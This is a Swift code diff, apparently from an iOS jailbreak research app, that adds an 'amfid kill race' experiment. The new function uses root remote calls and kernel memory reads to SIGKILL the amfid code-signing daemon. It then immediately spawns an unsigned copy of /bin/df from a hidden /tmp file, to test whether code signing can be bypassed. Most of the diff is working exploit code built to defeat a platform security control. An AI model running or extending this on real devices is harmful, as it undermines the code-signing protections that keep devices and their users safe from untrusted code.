@@ -223,6 +223,13 @@ struct AMFIExperimentView: View {
             let exp64 = self.expCoreTrustResearch(rc: rc)
             experimentResults.append(exp64)
             
+            // ============================================
+            // Experiment 65: amfid kill race
+            // Kill amfid + immediately spawn — test if binary runs in window
+            // ============================================
+            let exp65 = self.expAmfidKillRace(rc: rc)
+            experimentResults.append(exp65)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -1719,6 +1726,129 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("FOUND") || detail.contains("VALID")
         return ExperimentResult(name: "CoreTrust research", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - Experiment 65: amfid Kill Race
+    
+    /// Kill amfid daemon + immediately try to spawn unsigned binary
+    /// amfid auto-restarts (KeepAlive) but there's a window where it's dead
+    /// If kernel waits for amfid response and times out → might default-allow
+    /// SAFE: worst case = respring (amfid restarts, no bootloop)
+    private func expAmfidKillRace(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        let mgr = dspmgr.shared
+        var detail = "amfid Kill Race Experiment\n\n"
+        
+        // Step 1: Find amfid PID
+        let amfidProc = mgr.findProc(name: "amfid")
+        guard amfidProc != 0 else {
+            detail += "amfid not found!\n"
+            return ExperimentResult(name: "amfid kill race", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
+        detail += "amfid PID: \(amfidPid)\n"
+        
+        // Step 2: Prepare copied binary BEFORE killing amfid
+        let srcPath = remote_alloc_str(rc, "/bin/df")
+        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_race_bin")
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        
+        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
+        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
+            let buf = mem + 0x800
+            for _ in 0..<50 {
+                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
+                if n == 0 || n > 2048 { break }
+                RootExecutor.rcall(rc, "write", df, buf, n)
+            }
+            RootExecutor.rcall(rc, "close", sf)
+            RootExecutor.rcall(rc, "close", df)
+        }
+        detail += "Binary prepared at /tmp/.dsp_race_bin\n\n"
+        
+        // Step 3: Setup spawn args (ready to fire immediately after kill)
+        let argvBase = mem + 0x1C00
+        rc[argvBase].setValue64(dstPath)
+        rc[argvBase + 8].setValue64(0)
+        let pidAddr = mem + 0x1E00
+        
+        // Step 4: KILL amfid!
+        detail += "=== KILLING amfid (PID \(amfidPid)) ===\n"
+        let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9) // SIGKILL
+        detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"
+        
+        // Step 5: IMMEDIATELY try to spawn (race window!)
+        // No usleep — spawn as fast as possible while amfid is dead
+        rc[pidAddr].setValue64(0)
+        let spawnRet1 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
+        let spawnPid1 = rc[pidAddr].value32()
+        detail += "Spawn attempt 1 (immediate): ret=\(spawnRet1), pid=\(spawnPid1)\n"
+        
+        // Try again quickly
+        rc[pidAddr].setValue64(0)
+        let spawnRet2 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
+        let spawnPid2 = rc[pidAddr].value32()
+        detail += "Spawn attempt 2: ret=\(spawnRet2), pid=\(spawnPid2)\n"
+        
+        // Try once more
+        rc[pidAddr].setValue64(0)
+        let spawnRet3 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
+        let spawnPid3 = rc[pidAddr].value32()
+        detail += "Spawn attempt 3: ret=\(spawnRet3), pid=\(spawnPid3)\n"
+        
+        // Step 6: Wait and check if amfid restarted
+        RootExecutor.rcall(rc, "usleep", 2000000) // 2s — let amfid restart
+        
+        let newAmfidProc = mgr.findProc(name: "amfid")
+        if newAmfidProc != 0 {
+            let newPid = ds_kread32(newAmfidProc + UInt64(off_proc_p_pid))
+            detail += "\namfid restarted! New PID: \(newPid)\n"
+        } else {
+            detail += "\namfid NOT restarted yet (might cause issues)\n"
+        }
+        
+        // Step 7: Analyze results
+        detail += "\n=== RESULTS ===\n"
+        let anySuccess = spawnRet1 == 0 || spawnRet2 == 0 || spawnRet3 == 0
+        
+        if anySuccess {
+            detail += "SPAWN SUCCEEDED WHILE AMFID WAS DEAD!\n"
+            detail += "This means kernel DEFAULT-ALLOWS when amfid unavailable!\n"
+            detail += "FULL JAILBREAK PATH: kill amfid + spawn = bypass!\n"
+            
+            // Wait for spawned process
+            RootExecutor.rcall(rc, "usleep", 1000000)
+            let statusAddr = mem + 0x380
+            rc[statusAddr].setValue32(0)
+            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
+            let status = rc[statusAddr].value32()
+            let exited = (status & 0x7F) == 0
+            let sig = status & 0x7F
+            
+            if exited {
+                detail += "Process EXITED NORMALLY! Binary executed!\n"
+            } else if sig == 9 {
+                detail += "Process was SIGKILL'd (amfid restarted and killed it)\n"
+                detail += "But spawn DID succeed — need faster execution\n"
+            }
+        } else {
+            detail += "All spawns failed (ret=\(spawnRet1)/\(spawnRet2)/\(spawnRet3))\n"
+            if spawnRet1 == 13 {
+                detail += "EACCES — kernel enforces AMFI independently of amfid\n"
+                detail += "Killing amfid does NOT bypass code signing\n"
+            } else {
+                detail += "Different error — might be timing related\n"
+            }
+        }
+        
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        RootExecutor.rcall(rc, "free", srcPath)
+        RootExecutor.rcall(rc, "free", dstPath)
+        
+        return ExperimentResult(name: "amfid kill race", success: anySuccess, detail: detail, timestamp: Date())
     }
     
     #endif
